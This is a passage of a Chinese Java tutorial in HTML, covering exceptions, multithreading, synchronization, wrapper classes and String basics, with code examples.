class="number">2</span>=值。。。)</span><br></pre></td></tr></table></figure><p>（3）如果配置参数只有一个，并且名称是value，那么赋值时可以省略value=</p><p>（4）如果读取这个注解时，要获取配置参数的值的话，可以当成方法一样来访问</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">自定义注解对象.配置参数();</span><br></pre></td></tr></table></figure><h1 id="第九章-异常"><a href="#第九章-异常" class="headerlink" title="第九章 异常"></a>第九章 异常</h1><h2 id="9-1-异常的类型的体系结构"><a href="#9-1-异常的类型的体系结构" class="headerlink" title="9.1 异常的类型的体系结构"></a>9.1 异常的类型的体系结构</h2><p>1、异常系列的超父类：java.lang.Throwable</p><p>（1）只有它或它子类的对象，才能被JVM或throw语句“抛”出</p><p>（2）也只有它或它子类的对象，才能被catch“捕获”</p><p>2、Throwable分为两大派别</p><p>（1）Error：严重的错误，需要停下来重新设计、升级解决这个问题</p><p>（2）Exception： 一般的异常，可以通过判断、检验进行避免，或者使用try…catch进行处理</p><p>3、Exception又分为两大类</p><p>（1）运行时异常：</p><p>​    它是RuntimeException或它子类的对象。</p><p>​    这种类型的异常，编译器不会提醒你，要进行throws或try…catch进行处理，但是运行时可能导致崩溃。</p><p>（2）编译时异常：</p><p>​    异常除了运行时异常以外的都是编译时异常。</p><p>​    这种类型的异常，编译器是强制要求你，throws或try…catch进行处理，否则编译不通过。</p><p>4、列出常见的异常类型</p><p>（1）运行时异常</p><p>RuntimeException、NullPointerException（空指针异常），ClassCastException（类型转换异常），ArithmeticException（算术异常），NubmerFormatException（数字格式化异常），IndexOutOfBoundsException（下标越界异常）（ArrayIndexOutOfBoundsException（数组下标越界异常）、StringIndexOutOfBoundsException（字符串下标越界异常））、InputMisMatchException（输入类型不匹配异常）。。。。</p><p>（2）编译时异常</p><p>FileNotFoundException（文件找不到异常）、IOException（输入输出异常）、SQLException（数据库sql语句执行异常）。。。</p><h2 id="9-2-异常的处理"><a href="#9-2-异常的处理" class="headerlink" title="9.2 异常的处理"></a>9.2 异常的处理</h2><p>1、在当前方法中处理：try…catch…finally</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//形式一：try...catch</span></span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">    可能发生异常的代码</span><br><span class="line">&#125;<span class="keyword">catch</span>(异常类型  异常名e)&#123;</span><br><span class="line">    处理异常的代码（一般都是打印异常的信息的语句）</span><br><span class="line">&#125;<span class="keyword">catch</span>(异常类型  异常名e)&#123;</span><br><span class="line">    处理异常的代码（一般都是打印异常的信息的语句）</span><br><span class="line">&#125;。。。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//形式二：try...finally</span></span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">    可能发生异常的代码</span><br><span class="line">&#125;<span class="keyword">finally</span>&#123;</span><br><span class="line">    无论<span class="keyword">try</span>中是否有异常，也不管是不是有<span class="keyword">return</span>，都要执行的部分</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//形式三：try..catch..finally</span></span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">    可能发生异常的代码</span><br><span class="line">&#125;<span class="keyword">catch</span>(异常类型  异常名e)&#123;</span><br><span class="line">    处理异常的代码（一般都是打印异常的信息的语句）</span><br><span class="line">&#125;<span class="keyword">catch</span>(异常类型  异常名e)&#123;</span><br><span class="line">    处理异常的代码（一般都是打印异常的信息的语句）</span><br><span class="line">&#125;。。。</span><br><span class="line"><span class="keyword">finally</span>&#123;</span><br><span class="line">    无论<span class="keyword">try</span>中是否有异常，也不管<span class="keyword">catch</span>是否可以捕获异常，也不管<span class="keyword">try</span>和<span class="keyword">catch</span>中是不是有<span class="keyword">return</span>，都要执行的部分</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行特点：</p><p>（1）如果try中的代码没有异常，那么try中的代码会正常执行，catch部分就不执行，finally中会执行</p><p>（2）如果try中的代码有异常，那么try中发生异常的代码的后面就不执行了，找对应的匹配的catch分支执行，finally中会执行</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="imgs/1559610439025.png" alt="1559610439025" title>                </div>                <div class="image-caption">1559610439025</div>            </figure><p>2、finally与return混合使用时</p><p>（1）如果finally中有return，一定从finally中的return返回。</p><p>此时try和catch中的return语句，执行了一半，执行了第一个动作。所以，finally中的return语句会覆盖刚刚的返回值</p><p>return 返回值; 语句有两个动作：（1）把返回值放到“操作数栈”中，等当前方法结束后，这个“操作数栈”中的值会返回给调用处（2）结束当前方法的执行</p><p>（2）如果finally中没有return，finally中的语句会执行，但是不影响最终的返回值</p><p>即try和catch中的return语句两步拆开来走，先把（1）把返回值放到“操作数栈”中，（2）然后走finally中的语句（3）再执行return后半个动作，结束当前方法</p><p>3、在当前方法中不处理异常，明确要抛给调用者处理，使用throws</p><p>语法格式：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">【修饰符】 返回值类型  方法名(【形参列表】) <span class="keyword">throws</span> 异常列表&#123;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此时调用者，就知道需要处理哪些异常。</p><p>方法的重写的要求：</p><p>（1）方法名：相同</p><p>（2）形参列表：相同</p><p>（3）返回值类型：</p><p>​    基本数据类型和void：相同</p><p>​    引用数据类型：&lt;=</p><p>（4）修饰符：</p><p>​    权限修饰符：&gt;=</p><p>​    其他修饰符：static，final，private不能被重写</p><p>（5）throws：&lt;=</p><p>方法的重载：</p><p>（1）方法名：相同</p><p>（2）形参列表：必须不同</p><p>（3）返回值类型：无关</p><p>（4）修饰符：无关</p><p>（5）throws：无关</p><h2 id="9-3-手动抛出异常：throw"><a href="#9-3-手动抛出异常：throw" class="headerlink" title="9.3 手动抛出异常：throw"></a>9.3 手动抛出异常：throw</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">throw</span> 异常对象;</span><br><span class="line"></span><br><span class="line"><span class="comment">//例如：</span></span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> AccountException(<span class="string">"xxx"</span>);</span><br></pre></td></tr></table></figure><p>throw抛出来的异常对象，和JVM抛出来的异常对象一样，也要用try..catch处理或者throws。</p><p>如果是运行时异常，编译器不会强制要求你处理，如果是编译时异常，那么编译器会强制要求你处理。</p><h2 id="9-4-自定义异常"><a href="#9-4-自定义异常" class="headerlink" title="9.4  自定义异常"></a>9.4  自定义异常</h2><p>1、必须继承Throwable或它的子类</p><p>我们见到比较多的是继承RuntimeException和Exception.</p><p>如果你继承RuntimeException或它的子类，那么你自定义的这个异常就是运行时异常。编译器就不会提醒你处理。</p><p>如果你继承Exception，那么它属于编译时异常，编译器会强制你处理。</p><p>2、建议大家保留两个构造器</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//无参构造</span></span><br><span class="line"><span class="keyword">public</span> 自定义异常名()&#123;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//有参构造</span></span><br><span class="line"><span class="keyword">public</span> 自定义异常名(String message)&#123;</span><br><span class="line">    <span class="keyword">super</span>(message);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>3、自定义异常对象，必须手动抛出，用throw抛出</p><h2 id="9-5-关于异常的几个方法"><a href="#9-5-关于异常的几个方法" class="headerlink" title="9.5 关于异常的几个方法"></a>9.5 关于异常的几个方法</h2><p>（1）e.printStackTrace()：打印异常对象的详细信息，包括异常类型，message，堆栈跟踪信息。这个对于调试，或者日志跟踪是非常有用的</p><p>（2）e.getMessage()：只是获取异常的message信息</p><p>关于异常信息的打印：</p><p>用System.err打印和用e.printStackTrace()都是会标记红色的突出。</p><p>用System.out打印，当成普通信息打印。</p><p>这两个打印是两个独立的线程，顺序是不能精确控制的。</p><h1 id="第十章-多线程"><a href="#第十章-多线程" class="headerlink" title="第十章  多线程"></a>第十章  多线程</h1><h2 id="10-1-相关的概念"><a href="#10-1-相关的概念" class="headerlink" title="10.1 相关的概念"></a>10.1 相关的概念</h2><p>1、程序（Program）</p><p>​    为了实现一个功能，完成一个任务而选择一种编程语言编写的一组指令的集合。</p><p>2、进程（Process）</p><p>​    程序的一次运行。操作系统会给这个进程分配资源（内存）。</p><p>​    进程是操作系统分配资源的最小单位。</p><p>​    进程与进程之间的内存是独立，无法直接共享。</p><p>​    最早的DOS操作系统是单任务的，同一时间只能运行一个进程。后来现在的操作系统都是支持多任务的，可以同时运行多个进程。进程之间来回切换。成本比较高。</p><p>3、线程（Thread）</p><p>​    线程是进程中的其中一条执行路径。一个进程中至少有一个线程，也可以有多个线程。有的时候也把线程称为轻量级的进程。</p><p>​    同一个进程的多个线程之间有些内存是可以共享的（方法区、堆），也有些内存是独立的（栈（包括虚拟机栈和本地方法栈）、程序计数器）。</p><p>​    线程之间的切换相对进程来说成本比较低。</p><p>4、并行： 多个处理器同时可以执行多条执行路径。</p><p>5、并发：多个任务同时执行，但是可能存在先后关系。</p><h2 id="10-2-两种实现多线程的方式"><a href="#10-2-两种实现多线程的方式" class="headerlink" title="10.2  两种实现多线程的方式"></a>10.2  两种实现多线程的方式</h2><p>1、继承Thread类</p><p> 步骤：</p><p>（1）编写线程类，去继承Thread类</p><p>（2）重写public void run(){}</p><p>（3）创建线程对象</p><p>（4）调用start()</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyThread</span> <span class="keyword">extends</span> <span class="title">Thread</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="comment">//...</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        MyThread my = <span class="keyword">new</span> MyThread();</span><br><span class="line">        my.start();<span class="comment">//有名字的线程对象启动</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">new</span> MyThread().start();<span class="comment">//匿名线程对象启动</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">//匿名内部类的匿名对象启动</span></span><br><span class="line">        <span class="keyword">new</span> Thread()&#123;</span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span></span>&#123;</span><br><span class="line">                <span class="comment">//...</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;.start();</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//匿名内部类，但是通过父类的变量多态引用，启动线程</span></span><br><span class="line">        Thread t =  <span class="keyword">new</span> Thread()&#123;</span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span></span>&#123;</span><br><span class="line">                <span class="comment">//...</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        t.start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>2、实现Runnable接口</p><p>步骤：</p><p>（1）编写线程类，实现Runnable接口</p><p>（2）重写public void run(){}</p><p>（3）创建线程对象</p><p>（4）借助Thread类的对象启动线程</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyRunnable</span> <span class="keyword">implements</span> <span class="title">Runnable</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="comment">//...</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        MyRunnable my = <span class="keyword">new</span> MyRunnable();</span><br><span class="line">        Thread t1 = <span class="keyword">new</span> Thread(my);</span><br><span class="line">        Thread t2 = <span class="keyword">new</span> Thread(my);</span><br><span class="line">        t1.start();</span><br><span class="line">        t2.start();</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//两个匿名对象</span></span><br><span class="line">        <span class="keyword">new</span> Thread(<span class="keyword">new</span> MyRunnable()).start();</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//匿名内部类的匿名对象作为实参直接传给Thread的构造器</span></span><br><span class="line">        <span class="keyword">new</span> Thread(<span class="keyword">new</span> Runnable()&#123;</span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span></span>&#123;</span><br><span class="line">                <span class="comment">//...</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;).start();</span><br><span class="line">            </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="10-3-线程的生命周期"><a href="#10-3-线程的生命周期" class="headerlink" title="10.3 线程的生命周期"></a>10.3 线程的生命周期</h2><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="imgs/1559782705811.png" alt="1559782705811" title>                </div>                <div class="image-caption">1559782705811</div>            </figure><h2 id="10-4-Thread的相关API"><a href="#10-4-Thread的相关API" class="headerlink" title="10.4 Thread的相关API"></a>10.4 Thread的相关API</h2><p>1、构造器</p><ul><li>Thread()</li><li>Thread(String name)</li><li>Thread(Runnable target)</li><li>Thread(Runnable target, String name)</li></ul><p>2、其他方法</p><p>（1）public void run()</p><p>（2）public void start()</p><p>（3）获取当前线程对象：Thread.currentThread()</p><p>（4）获取当前线程的名称：getName()</p><p>（5）设置或获取线程的优先级：set/getPriority()</p><p>优先级的范围：[1,10]，Thread类中有三个常量：MAX_PRIORITY(10)，MIN_PRIORITY(1)，NORM_PRIORITY(5)</p><p>优先级只是影响概率。</p><p>（6）线程休眠：Thread.sleep(毫秒)</p><p>（7）打断线程：interrupt()</p><p>（8）暂停当前线程：Thread.yield()</p><p>（9）线程要加塞：join()</p><blockquote><p>xx.join()这句代码写在哪个线程体中，哪个线程被加塞，和其他线程无关。</p></blockquote><p>（10）判断线程是否已启动但未终止：isAlive()</p><h2 id="10-5-关键字：volatile"><a href="#10-5-关键字：volatile" class="headerlink" title="10.5 关键字：volatile"></a>10.5 关键字：volatile</h2><p>volatile：易变，不稳定，不一定什么时候会变</p><p>修饰：成员变量</p><p>作用：当多个线程同时去访问的某个成员变量时，而且是频繁的访问，再多次访问时，发现它的值没有修改，Java执行引擎就会对这个成员变量的值进行缓存。一旦缓存之后，这个时候如果有一个线程把这个成员变量的值修改了，Jav执行引擎还是从缓存中读取，导致这个值不是最新的。如果不希望Java执行引擎把这个成员变的值缓存起来，那么就可以在成员变量的前面加volatile，每次用到这个成员变量时，都是从主存中读取。</p><h2 id="10-6-关键字：synchronized（同步）"><a href="#10-6-关键字：synchronized（同步）" class="headerlink" title="10.6  关键字：synchronized（同步）"></a>10.6  关键字：synchronized（同步）</h2><p>1、什么情况下会发生线程安全问题？</p><p>（1）多个线程</p><p>（2）共享数据</p><p>（3）多个线程的线程体中，多条语句再操作这个共享数据时</p><p>2、如何解决线程安全问题？同步锁</p><p>形式一：同步代码块</p><p>形式二：同步方法</p><p>3、同步代码块</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">synchronized</span>(锁对象)&#123;</span><br><span class="line">    <span class="comment">//一次任务代码，这其中的代码，在执行过程中，不希望其他线程插一脚</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>锁对象：</p><p>（1）任意类型的对象</p><p>（2）确保使用共享数据的这几个线程，使用同一个锁对象</p><p>4、同步方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">synchronized</span> 【修饰符】 返回值类型  方法名(【形参列表】)<span class="keyword">throws</span> 异常列表&#123;</span><br><span class="line">    <span class="comment">//同一时间，只能有一个线程能进来运行</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>锁对象：</p><p>（1）非静态方法：this（谨慎）</p><p>（2）静态方法：当前类的Class对象</p><h2 id="10-7-线程通信"><a href="#10-7-线程通信" class="headerlink" title="10.7 线程通信"></a>10.7 线程通信</h2><p>1、为了解决“生产者与消费者问题”。</p><p>当一些线程负责往“数据缓冲区”放数据，另一个线程负责从“数据缓冲区”取数据。</p><p>问题1：生产者线程与消费者线程使用同一个数据缓冲区，就是共享数据，那么要考虑同步</p><p>问题2：当数据缓冲区满的时候，生产者线程需要wait()， 当消费者消费了数据后，需要notify或notifyAll</p><p>​        当数据缓冲区空的时候，消费者线程需要wait()， 当生产者生产了数据后，需要notify或notifyAll</p><p>2、java.lang.Object类中声明了：</p><p>（1）wait()：必须由“同步锁”对象调用</p><p>（2）notfiy()和notifyAll()：必须由“同步锁”对象调用</p><p>3、面试题：sleep()和wait的区别</p><p>（1）sleep()不释放锁，wait()释放锁</p><p>（2）sleep()在Thread类中声明的，wait()在Object类中声明</p><p>（3）sleep()是静态方法，是Thread.sleep()</p><p>​        wait()是非静态方法，必须由“同步锁”对象调用</p><p>（4）sleep()方法导致当前线程进入阻塞状态后，当时间到或interrupt()醒来</p><p>​     wait()方法导致当前线程进入阻塞状态后，由notify或notifyAll()</p><p>4、哪些操作会释放锁？</p><p>（1）同步代码块或同步方法正常执行完一次自动释放锁</p><p>（2）同步代码块或同步方法遇到return等提前结束</p><p>（3）wait()</p><p>5、不释放锁</p><p>（1）sleep()</p><p>（2）yield()</p><p>（3）suspend()</p><h1 id="第十一章-常用类"><a href="#第十一章-常用类" class="headerlink" title="第十一章 常用类"></a>第十一章 常用类</h1><h2 id="11-1-包装类"><a href="#11-1-包装类" class="headerlink" title="11.1 包装类"></a>11.1 包装类</h2><h3 id="11-1-1-包装类"><a href="#11-1-1-包装类" class="headerlink" title="11.1.1 包装类"></a>11.1.1 包装类</h3><p>当要使用只针对对象设计的API或新特性（例如泛型），那么基本数据类型的数据就需要用包装类来包装。</p><table><thead><tr><th>序号</th><th>基本数据类型</th><th>包装类</th></tr></thead><tbody><tr><td>1</td><td>byte</td><td>Byte</td></tr><tr><td>2</td><td>short</td><td>Short</td></tr><tr><td>3</td><td>int</td><td>Integer</td></tr><tr><td>4</td><td>long</td><td>Long</td></tr><tr><td>5</td><td>float</td><td>Float</td></tr><tr><td>6</td><td>double</td><td>Double</td></tr><tr><td>7</td><td>char</td><td>Character</td></tr><tr><td>8</td><td>boolean</td><td>Boolean</td></tr><tr><td>9</td><td>void</td><td>Void</td></tr></tbody></table><h3 id="11-1-2-装箱与拆箱"><a href="#11-1-2-装箱与拆箱" class="headerlink" title="11.1.2  装箱与拆箱"></a>11.1.2  装箱与拆箱</h3><p>JDK1.5之后，可以自动装箱与拆箱。</p><p>注意：只能与自己对应的类型之间才能实现自动装箱与拆箱。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Integer i = <span class="number">1</span>;</span><br><span class="line">Double d = <span class="number">1</span>;<span class="comment">//错误的，1是int类型</span></span><br></pre></td></tr></table></figure><p> 装箱：把基本数据类型转为包装类对象。</p><blockquote><p>转为包装类的对象，是为了使用专门为对象设计的API和特性</p></blockquote><p>拆箱：把包装类对象拆为基本数据类型。</p><blockquote><p>转为基本数据类型，一般是因为需要运算，Java中的大多数运算符是为基本数据类型设计的。比较、算术等</p></blockquote><p>总结：对象（引用数据类型）能用的运算符有哪些？</p><p>（1）instanceof</p><p>（2）=：赋值运算符</p><p>（3）==和!=：用于比较地址，但是要求左右两边对象的类型一致或者是有父子类继承关系。</p><p>（4）对于字符串这一种特殊的对象，支持“+”，表示拼接。</p><h3 id="11-1-3-包装类的一些API"><a href="#11-1-3-包装类的一些API" class="headerlink" title="11.1.3 包装类的一些API"></a>11.1.3 包装类的一些API</h3><p>1、基本数据类型和字符串之间的转换</p><p>（1）把基本数据类型转为字符串</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> a = <span class="number">10</span>;</span><br><span class="line"><span class="comment">//String str = a;//错误的</span></span><br><span class="line"><span class="comment">//方式一：</span></span><br><span class="line">String str = a + <span class="string">""</span>;</span><br><span class="line"><span class="comment">//方式二：</span></span><br><span class="line">String str = String.valueOf(a);</span><br></pre></td></tr></table></figure><p>（2）把字符串转为基本数据类型</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> a = Integer.parseInt(<span class="string">"整数的字符串"</span>);</span><br><span class="line"><span class="keyword">double</span> a = Double.parseDouble(<span class="string">"小数的字符串"</span>);</span><br><span class="line"><span class="keyword">boolean</span> b = Boolean.parseBoolean(<span class="string">"true或false"</span>);</span><br></pre></td></tr></table></figure><p>2、数据类型的最大最小值</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Integer.MAX_VALUE和Integer.MIN_VALUE</span><br><span class="line">Long.MAX_VALUE和Long.MIN_VALUE</span><br><span class="line">Double.MAX_VALUE和Double.MIN_VALUE</span><br></pre></td></tr></table></figure><p>3、转大小写</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Character.toUpperCase(<span class="string">'x'</span>);</span><br><span class="line">Character.toLowerCase(<span class="string">'X'</span>);</span><br></pre></td></tr></table></figure><p>4、转进制</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Integer.toBinaryString(<span class="keyword">int</span> i) </span><br><span class="line">Integer.toHexString(<span class="keyword">int</span> i)</span><br><span class="line">Integer.toOctalString(<span class="keyword">int</span> i)</span><br></pre></td></tr></table></figure><h3 id="11-1-4-包装类对象的缓存问题"><a href="#11-1-4-包装类对象的缓存问题" class="headerlink" title="11.1.4 包装类对象的缓存问题"></a>11.1.4 包装类对象的缓存问题</h3><table><thead><tr><th>包装类</th><th>缓存对象</th></tr></thead><tbody><tr><td>Byte</td><td>-128~127</td></tr><tr><td>Short</td><td>-128~127</td></tr><tr><td>Integer</td><td>-128~127</td></tr><tr><td>Long</td><td>-128~127</td></tr><tr><td>Float</td><td>没有</td></tr><tr><td>Double</td><td>没有</td></tr><tr><td>Character</td><td>0~127</td></tr><tr><td>Boolean</td><td>true和false</td></tr></tbody></table><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">Integer i = <span class="number">1</span>;</span><br><span class="line">Integer j = <span class="number">1</span>;</span><br><span class="line">System.out.println(i == j);<span class="comment">//true</span></span><br><span class="line"></span><br><span class="line">Integer i = <span class="number">128</span>;</span><br><span class="line">Integer j = <span class="number">128</span>;</span><br><span class="line">System.out.println(i == j);<span class="comment">//false</span></span><br><span class="line"></span><br><span class="line">Integer i = <span class="keyword">new</span> Integer(<span class="number">1</span>);<span class="comment">//新new的在堆中</span></span><br><span class="line">Integer j = <span class="number">1</span>;<span class="comment">//这个用的是缓冲的常量对象，在方法区</span></span><br><span class="line">System.out.println(i == j);<span class="comment">//false</span></span><br><span class="line"></span><br><span class="line">Integer i = <span class="keyword">new</span> Integer(<span class="number">1</span>);<span class="comment">//新new的在堆中</span></span><br><span class="line">Integer j = <span class="keyword">new</span> Integer(<span class="number">1</span>);<span class="comment">//另一个新new的在堆中</span></span><br><span class="line">System.out.println(i == j);<span class="comment">//false</span></span><br><span class="line"></span><br><span class="line">Integer i = <span class="keyword">new</span> Integer(<span class="number">1</span>);</span><br><span class="line"><span class="keyword">int</span> j = <span class="number">1</span>;</span><br><span class="line">System.out.println(i == j);<span class="comment">//true，凡是和基本数据类型比较，都会先拆箱，按照基本数据类型的规则比较</span></span><br></pre></td></tr></table></figure><h2 id="11-2-字符串"><a href="#11-2-字符串" class="headerlink" title="11.2 字符串"></a>11.2 字符串</h2><h3 id="11-2-1-字符串的特点"><a href="#11-2-1-字符串的特点" class="headerlink" title="11.2.1 字符串的特点"></a>11.2.1 字符串的特点</h3><p>1、字符串String类型本身是final声明的，意味着我们不能继承String。</p><p>2、字符串的对象也是不可变对象，意味着一旦进行修改，就会产生新对象</p><blockquote><p>我们修改了字符串后，如果想要获得新的内容，必须重新接受。</p><p>如果程序中涉及到大量的字符串的修改操作，那么此时的时空消耗比较高。可能需要考虑使用StringBuilder或StringBuffer。</p></blockquote><p>3、String对象内部是用字符数组进行保存的</p><blockquote><p>JDK1.9之前有一个char[] value数组，JDK1.9之后byte[]数组</p></blockquote><p>4、String类中这个char[] values数组也是final修饰的，意味着这个数组不可变，然后它是private修饰，外部不能直接操作它，String类型提供的所有的方法都是用新对象来表示修改后内容的，所以保证了String对象的不可变。</p><p>5、就因为字符串对象设计为不可变，那么所以字符串有常量池来保存很多常量对象</p><p>常量池在方法区。</p><p>如果细致的划分：</p><p>（1）JDK1.6及其之前：方法区</p><p>（2）JDK1.7：堆</p><p>（3）JDK1.8：元空间</p><h3 id="11-2-2-字符串对象的比较"><a href="#11-2-2-字符串对象的比较" class="headerlink" title="11.2.2  字符串对象的比较"></a>11.2.2  字符串对象的比较</h3><p>1、==：比较是对象的地址</p><blockquote><p>只有两个字符串变量都是指向字符串的常量对象时，才会返回true</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">String str1 = <span class="string">"hello"</span>;</span><br><span class="line">String str2 = <span class="string">"hello"</span>;</span><br><span class="line">str1 == str2<span class="comment">//true</span></span><br></pre></td></tr></table></figure><p>2、equals：比较是对象的内容，因为String类型重写equals，区分大小写</p><p>只要两个字符串的字符内容相同，就会返回true</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">String str1 = <span class="keyword">new</span> String(<span class="string">"hello"</span>);</span><br><span class="line">String str2 = <span class="keyword">new</span> String(<span class="string">"hello"</span>);</span><br><span class="line">str1.equals(strs) <span 